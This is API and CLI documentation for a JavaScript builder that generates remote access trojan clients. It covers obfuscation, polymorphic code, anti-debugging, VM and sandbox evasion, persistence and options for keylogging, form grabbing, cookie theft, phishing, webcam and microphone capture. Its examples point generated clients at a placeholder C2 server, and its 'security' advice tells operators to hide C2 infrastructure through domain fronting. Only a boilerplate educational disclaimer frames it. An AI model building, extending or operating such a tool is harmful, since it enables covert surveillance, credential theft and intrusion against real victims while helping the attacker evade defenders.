# RAT C2 Builder API Documentation

## Overview

The RAT C2 Builder provides a comprehensive API for generating customized remote access clients with advanced obfuscation, persistence, and stealth capabilities.

## Core Classes

### RatBuilder

Main class for building RAT clients.

#### Constructor

```javascript
const builder = new RatBuilder();
```

#### Methods

##### buildClient(options)

Builds a single RAT client.

**Parameters:**
- `options` (Object): Configuration options
  - `serverUrl` (string): C2 server URL
  - `authToken` (string): Authentication token
  - `template` (string): Template name ('basic', 'stealth', 'browser')
  - `clientId` (string, optional): Unique client identifier
  - `obfuscate` (boolean, default: true): Enable code obfuscation
  - `persistence` (boolean, default: false): Add persistence mechanisms
  - `executable` (boolean, default: false): Generate executable
  - `name` (string, default: 'rat_client'): Output filename
  - `target` (string, default: 'win'): Target platform

**Returns:**
- Object containing client information:
  - `path` (string): Path to generated client
  - `clientId` (string): Generated client ID
  - `config` (Object): Configuration used

**Example:**
```javascript
const client = builder.buildClient({
  serverUrl: 'https://c2.example.com',
  authToken: 'secure-token-123',
  template: 'stealth',
  obfuscate: true,
  persistence: true,
  executable: true
});
```

##### batchBuild(configurations)

Builds multiple RAT clients.

**Parameters:**
- `configurations` (Array): Array of configuration objects

**Returns:**
- Array of build results

**Example:**
```javascript
const configs = [
  { serverUrl: 'https://c2.example.com', authToken: 'token1', template: 'basic' },
  { serverUrl: 'https://c2.example.com', authToken: 'token2', template: 'stealth' }
];
const results = builder.batchBuild(configs);
```

##### loadTemplate(templateName)

Loads a client template.

**Parameters:**
- `templateName` (string): Name of template to load

**Returns:**
- Template code as string

##### generateExecutable(jsPath, name, target)

Creates an executable from JavaScript code.

**Parameters:**
- `jsPath` (string): Path to JavaScript file
- `name` (string): Output name
- `target` (string): Target platform ('win', 'linux', 'macos')

### ConfigBuilder

Class for managing client configurations.

#### Constructor

```javascript
const configBuilder = new ConfigBuilder();
```

#### Methods

##### createBasicConfig(options)

Creates a basic configuration.

**Parameters:**
- `options` (Object): Configuration options

**Returns:**
- Configuration object

##### createStealthConfig(options)

Creates a stealth configuration with anti-analysis features.

**Parameters:**
- `options` (Object): Configuration options

**Returns:**
- Stealth configuration object

##### createBrowserConfig(options)

Creates a browser-based configuration.

**Parameters:**
- `options` (Object): Configuration options

**Returns:**
- Browser configuration object

##### createAdvancedConfig(options)

Creates an advanced configuration with all features.

**Parameters:**
- `options` (Object): Configuration options

**Returns:**
- Advanced configuration object

##### createPreset(presetName, options)

Creates a configuration from a preset.

**Parameters:**
- `presetName` (string): Preset name
- `options` (Object): Override options

**Available Presets:**
- `basic_test`: Basic test configuration
- `stealth_production`: Production stealth configuration
- `browser_campaign`: Browser campaign configuration
- `advanced_pentest`: Advanced penetration testing

**Returns:**
- Configuration object

##### generateBatchConfig(options)

Generates multiple configurations.

**Parameters:**
- `options` (Object):
  - `count` (number): Number of configurations to generate
  - `template` (string): Template to use
  - `serverUrl` (string): C2 server URL
  - `authToken` (string): Authentication token

**Returns:**
- Array of configuration objects

##### saveConfig(config, filename)

Saves configuration to file.

**Parameters:**
- `config` (Object): Configuration to save
- `filename` (string): Output filename

**Returns:**
- Path to saved file

##### loadConfig(filename)

Loads configuration from file.

**Parameters:**
- `filename` (string): Configuration filename

**Returns:**
- Loaded configuration object

### Obfuscator

Class for code obfuscation and anti-analysis.

#### Constructor

```javascript
const obfuscator = new Obfuscator();
```

#### Methods

##### obfuscateCode(code, options)

Obfuscates JavaScript code.

**Parameters:**
- `code` (string): JavaScript code to obfuscate
- `options` (Object):
  - `method` (string): Obfuscation method ('base64', 'xor', 'custom')
  - `variables` (boolean, default: true): Obfuscate variable names
  - `strings` (boolean, default: true): Obfuscate string literals
  - `controlFlow` (boolean, default: true): Obfuscate control flow
  - `deadCode` (boolean, default: true): Add dead code

**Returns:**
- Obfuscated code string

##### createSelfDeobfuscatingWrapper(code, method)

Creates a self-deobfuscating wrapper.

**Parameters:**
- `code` (string): Code to wrap
- `method` (string): Deobfuscation method

**Returns:**
- Wrapped code string

##### generatePolymorphicCode(template, variations)

Generates polymorphic variants.

**Parameters:**
- `template` (string): Base code template
- `variations` (number): Number of variants to generate

**Returns:**
- Array of code variants

##### addAntiDebugging(code)

Adds anti-debugging measures.

**Parameters:**
- `code` (string): Code to protect

**Returns:**
- Protected code string

## Configuration Options

### Basic Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `serverUrl` | string | - | C2 server URL |
| `authToken` | string | - | Authentication token |
| `clientId` | string | auto-generated | Unique client identifier |
| `template` | string | 'basic' | Client template |
| `obfuscate` | boolean | true | Enable obfuscation |
| `persistence` | boolean | false | Add persistence |
| `heartbeatInterval` | number | 5000 | Heartbeat frequency (ms) |
| `maxRetries` | number | 3 | Maximum connection retries |
| `retryDelay` | number | 10000 | Retry delay (ms) |

### Stealth Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `antiDebug` | boolean | true | Anti-debugging measures |
| `antiVM` | boolean | true | VM detection |
| `antiSandbox` | boolean | true | Sandbox detection |
| `encryptedCommunication` | boolean | true | Encrypted C2 communication |
| `randomDelays` | boolean | true | Randomized delays |
| `userAgents` | array | - | Custom user agents |

### Browser Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `captureScreenshots` | boolean | false | Screenshot capability |
| `keylogger` | boolean | false | Keylogging functionality |
| `formGrabber` | boolean | false | Form data extraction |
| `cookieExtractor` | boolean | false | Cookie extraction |
| `domManipulation` | boolean | false | DOM manipulation |
| `phishing` | boolean | false | Phishing capabilities |

### Advanced Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `fileOperations` | boolean | false | File system operations |
| `shellCommands` | boolean | false | Shell command execution |
| `processInjection` | boolean | false | Process injection |
| `networkSniffing` | boolean | false | Network traffic capture |
| `clipboardAccess` | boolean | false | Clipboard access |
| `webcamAccess` | boolean | false | Webcam access |
| `microphoneAccess` | boolean | false | Microphone access |

## Error Handling

All methods throw errors for invalid parameters or failures. Use try-catch blocks:

```javascript
try {
  const client = builder.buildClient(options);
  console.log('Client built:', client);
} catch (error) {
  console.error('Build failed:', error.message);
}
```

## Events

The builder doesn't use events, but the generated clients emit events:

```javascript
// Client events
client.on('connected', () => console.log('Connected to C2'));
client.on('command', (cmd) => console.log('Received command:', cmd));
client.on('response', (resp) => console.log('Command response:', resp));
client.on('error', (err) => console.error('Client error:', err));
```

## Security Considerations

1. **Token Security**: Always use strong, unique authentication tokens
2. **HTTPS**: Use HTTPS for all C2 communications
3. **Obfuscation**: Enable obfuscation for production deployments
4. **Domain Fronting**: Consider using CDN services for hiding C2 infrastructure
5. **Rate Limiting**: Implement rate limiting on C2 server

## Examples

See `examples/basic-usage.js` for comprehensive usage examples.

## CLI Reference

### Rat Builder CLI

```bash
# Build single client
node builder/index.js build <serverUrl> <authToken> [template] [options]

# List templates
node builder/index.js templates

# Batch build
node builder/index.js batch <config.json>
```

### Config Builder CLI

```bash
# Create configuration
node builder/config-builder.js create <type> [options]

# Use preset
node builder/config-builder.js preset <name> [options]

# Generate batch
node builder/config-builder.js batch <count> [options]

# List presets
node builder/config-builder.js presets
```

## Troubleshooting

### Common Issues

1. **Module not found**: Ensure all dependencies are installed
2. **Permission denied**: Check file permissions for output directories
3. **Build failures**: Verify template syntax and configuration validity
4. **Connection issues**: Check C2 server URL and authentication

### Debug Mode

Enable debug logging:

```bash
export DEBUG=rat-builder
node builder/index.js build ...
```

## Legal Disclaimer

This software is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse of this software. Users must comply with all applicable laws and regulations.
